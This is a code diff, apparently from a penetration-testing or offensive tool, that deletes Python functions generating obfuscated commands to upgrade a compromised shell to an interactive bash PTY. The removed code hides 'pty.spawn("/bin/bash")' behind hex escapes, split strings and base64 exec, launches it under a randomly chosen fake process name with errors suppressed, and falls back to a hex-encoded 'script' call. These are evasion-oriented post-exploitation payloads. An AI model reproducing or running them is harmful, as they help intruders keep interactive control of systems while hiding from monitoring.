@@ -104,38 +104,3 @@ METHODS: list[tuple[str, str, Callable[[str], str]]] = [
 
 def _hex(s: str) -> str:
     return "".join(f"\\x{ord(c):02x}" for c in s)
-
-
-def _py_hex_import() -> str:
-    """__import__("\\x70\\x74\\x79").spawn("\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68")"""
-    return f'__import__("{_hex("pty")}").spawn("{_hex("/bin/bash")}")'
-
-
-def _py_getattr_concat() -> str:
-    """getattr(__import__("p"+"ty"), "sp"+"awn")("/bin/bash")"""
-    i = random.randint(1, 2)
-    j = random.randint(1, 4)
-    pty_split   = f'"{"pty"[:i]}"+"{"pty"[i:]}"'
-    spawn_split = f'"{"spawn"[:j]}"+"{"spawn"[j:]}"'
-    return f'getattr(__import__({pty_split}),{spawn_split})("/bin/bash")'
-
-
-def _py_b64_exec() -> str:
-    """exec(__import__("base64").b64decode(b"...").decode())"""
-    payload = 'import pty; pty.spawn("/bin/bash")'
-    encoded = base64.b64encode(payload.encode()).decode()
-    return f'exec(__import__("base64").b64decode(b"{encoded}").decode())'
-
-
-def obfuscated_upgrade_spawn() -> str:
-    """Return a randomised obfuscated upgrade command for Linux PTY spawn."""
-    technique = random.choice([_py_hex_import, _py_getattr_concat, _py_b64_exec])
-    code = technique()
-    name = random.choice(_FAKE_PROC_NAMES)
-    py = (
-        f"exec -a '{name}' python3 -c '{code}' 2>/dev/null || "
-        f"exec -a '{name}' python -c '{code}' 2>/dev/null"
-    )
-    script = "$'" + "".join(f"\\x{ord(c):02x}" for c in "script") + "'"
-    fallback = f"{script} -qc /bin/bash /dev/null"
-    return f"{py} || {fallback}\n"
